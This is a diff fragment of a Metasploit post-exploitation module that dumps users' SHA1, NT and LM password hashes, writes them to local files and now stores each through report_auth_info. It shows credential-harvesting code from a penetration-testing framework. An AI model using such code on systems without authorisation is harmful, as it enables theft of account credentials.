@@ -169,39 +169,39 @@ class Metasploit3 < Msf::Post
 			if sha1_hash !~ /00000000000000000000000000000000/
 				print_status("SHA1:#{user}:#{sha1_hash}")
 				file_local_write(sha1_file,"#{user}:#{sha1_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 0,
 					:sname  => 'sha1',
 					:user   => user,
 					:pass   => sha1_hash,
 					:active => false
-				}
+				)
 			end
 
 			if nt_hash !~ /000000000000000/
 				print_status("NT:#{user}:#{nt_hash}")
 				file_local_write(nt_file,"#{user}:#{nt_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
 					:pass   => nt_hash,
 					:active => true
-				}
+				)
 			end
 			if lm_hash !~ /0000000000000/
 				print_status("LM:#{user}:#{lm_hash}")
 				file_local_write(lm_file,"#{user}:#{lm_hash}")
-				report_hash = {
+				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
 					:pass   => lm_hash,
 					:active => true
-				}
+				)
 			end
 		end
 	end
